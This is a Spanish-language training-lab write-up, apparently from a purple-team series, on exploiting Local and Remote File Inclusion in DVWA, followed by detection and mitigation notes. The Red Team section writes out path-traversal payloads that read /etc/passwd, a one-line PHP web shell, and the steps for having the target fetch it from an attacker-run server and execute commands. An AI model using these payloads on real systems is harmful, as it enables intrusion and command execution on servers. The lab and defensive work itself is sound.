# Día 9 — File Inclusion (LFI & RFI)

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application  
**Táctica:** Initial Access (TA0001)

## 🔴 Red Team

### LFI — Local File Inclusion
| URL | Output |
|---|---|
| `?page=../../../../../etc/passwd` | Lista completa de usuarios del sistema |
| `?page=../../../../../proc/version` | Versión exacta del kernel — útil para buscar CVEs |

### Información obtenida via LFI
- Usuario real con shell: `root` — único usuario con `/bin/bash`
- Cuentas de servicio: `www-data`, `mysql`, `nobody` y otros con `/nologin`
- Kernel: `Linux 6.17.0-19-generic Ubuntu` — versión exacta para búsqueda de CVEs
- Técnica: path traversal con `../` para subir niveles de directorio

### RFI — Remote File Inclusion
| Paso | Acción |
|---|---|
| 1 | Crear `shell.php` en Ubuntu: `<?php system($_GET["cmd"]); ?>` |
| 2 | Levantar servidor PHP: `php -S 0.0.0.0:8888` |
| 3 | DVWA incluye el archivo remoto via URL |
| 4 | Ejecutar comandos via parámetro `cmd` |

### Comandos ejecutados remotamente
| Comando | Output |
|---|---|
| `whoami` | `vboxuser` |
| `id` | `uid=1000(vboxuser) groups=sudo,docker` — acceso casi total |

### LFI vs RFI
- **LFI** — lee archivos locales del servidor — lista usuarios, lee configuraciones, obtiene versión del kernel para buscar CVEs
- **RFI** — ejecuta código remoto en el servidor — control total si `allow_url_include=On`
- RFI es considerablemente más peligroso — es ejecución remota de código, paso directo hacia reverse shell

## 🔵 Blue Team

### Detección
- Parámetro `page` con `../` en logs de Apache — path traversal detectable
- Requests HTTP salientes desde el servidor hacia IPs externas — RFI detectable
- `allow_url_include=On` es una misconfiguration que nunca debería estar activa en producción

## 🟣 Purple Team Analysis

**Effectiveness Score: 75/100**

### Security Gaps
- `allow_url_include=On` en php.ini — habilita RFI
- Sin validación del parámetro `page` — acepta cualquier path o URL
- Sin WAF para detectar path traversal (`../`)

### Mitigación
- Deshabilitar `allow_url_include` en php.ini
- Validar y sanitizar el parámetro `page` — usar whitelist de archivos permitidos
- Implementar WAF con reglas para detectar `../` en parámetros

### Lección
LFI permite leer archivos sensibles del servidor — credenciales, configuraciones, usuarios. RFI va más lejos — si `allow_url_include` está habilitado, el servidor ejecuta código de una URL externa. En entornos reales esto es equivalente a darle al atacante un terminal en el servidor.

## 🟡 Wazuh
- Pendiente — análisis en próxima sesión
